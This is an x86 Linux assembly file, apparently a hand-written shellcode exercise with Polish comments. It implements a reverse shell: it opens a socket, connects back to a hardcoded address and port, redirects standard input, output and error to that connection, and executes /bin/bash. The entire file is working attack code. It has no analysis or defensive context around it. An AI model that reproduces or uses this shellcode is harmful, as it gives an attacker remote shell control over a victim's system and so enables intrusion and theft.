; By Domin568



[BITS 32]

section .text

xor eax,eax
xor ebx,ebx
mov al,0x66 ; sock syscall number
mov bl,1 ; SYS_SOCKET

xor ecx,ecx
push ecx
inc ecx
push ecx
inc ecx
push ecx

mov ecx,esp ; 3 parametry na stosie
int 0x80

;mov ebx, eax deskryptor tego socketa
xor eax,eax

mov al, 0x66 ; sock syscall number
mov bl,3

xor ecx,ecx

push ecx
push ecx
push 0x0138a8c0
push word 0xb315
push word 2
mov ebp, esp
mov cl,0x10
push ecx
sub esp,4
mov [esp], ebp
mov cl,3
push ecx
mov ecx,esp
int 0x80

xor ebx,ebx
xor ecx,ecx
xor eax,eax
mov al,0x3f
mov bl,3 
int 0x80
xor eax,eax
mov al,0x3f
mov cl,1
int 0x80
xor eax,eax
mov al,0x3f
mov cl,2
int 0x80

; wszystko przekierowane

xor eax,eax 
mov al,0x68
push eax
push 0x7361622f
push 0x6e69622f
mov ebx,esp
xor eax,eax
mov ecx,eax
mov edx,eax
mov al,0x0b
int 0x80
